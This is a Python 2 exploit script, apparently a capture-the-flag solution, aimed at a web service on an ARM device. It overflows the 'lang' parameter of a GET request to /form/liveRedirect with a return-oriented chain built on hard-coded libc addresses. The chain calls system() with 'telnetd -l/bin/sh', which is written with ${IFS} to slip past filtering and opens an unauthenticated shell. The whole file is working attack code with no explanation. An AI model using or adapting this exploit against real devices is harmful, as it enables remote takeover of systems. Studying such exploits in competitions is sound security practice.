#!/usr/bin/python2
# Warning : This script is should be used with python2 only
from warnings import filterwarnings
filterwarnings("ignore")
from telnetlib import Telnet
import struct
import re
import sys
import socket
import time
import argparse


class MachineInstance:
    def __init__(self,address=None,port=None,buffer=None):
        self.address = address
        self.port = port
        self.buffer = buffer

def formatCommand(command):
    return re.sub(r'\s+', '${IFS}', command)+";"

def payload(command):
    def pack32(value):
        return struct.pack("<I", value)  # little byte order
    libc_base = 0x40021000
    buf = "A" * 284
    ldr_r0_sp = pack32(0x40060b58)
    mov_r0 = pack32(libc_base + 0x00033a98)
    system = pack32(0x4006079c)
    buf += ldr_r0_sp
    buf += "BBBB"
    buf += "CCCC"
    buf += system
    buf += mov_r0
    buf += command
    buf += "C" * (400-len(buf))
    lang = buf
    return lang


def sendExploit(machineInstance):
    request = "GET /form/liveRedirect?lang=%s HTTP/1.0\n" % machineInstance.buffer + \
        "Host: BBBBBBBBBBBB\nUser-Agent: Team/Snowmen\n\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((machineInstance.address, int(machineInstance.port)))
    s.send(request)
    s.recv(100)
    time.sleep(2)
    return 0


def main(machineInstance):
    command="telnetd -l/bin/sh"
    machineInstance.buffer = payload(formatCommand(command=command))
    sendExploit(machineInstance=machineInstance)


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Get Flag")
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        parser.add_argument("--port", "-p", dest="port", required=True, help="Server Port")
        args = parser.parse_args()
        machineInstance=MachineInstance(
            address=args.address, 
            port=args.port,
        )
        main(machineInstance)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        sys.exit(1)




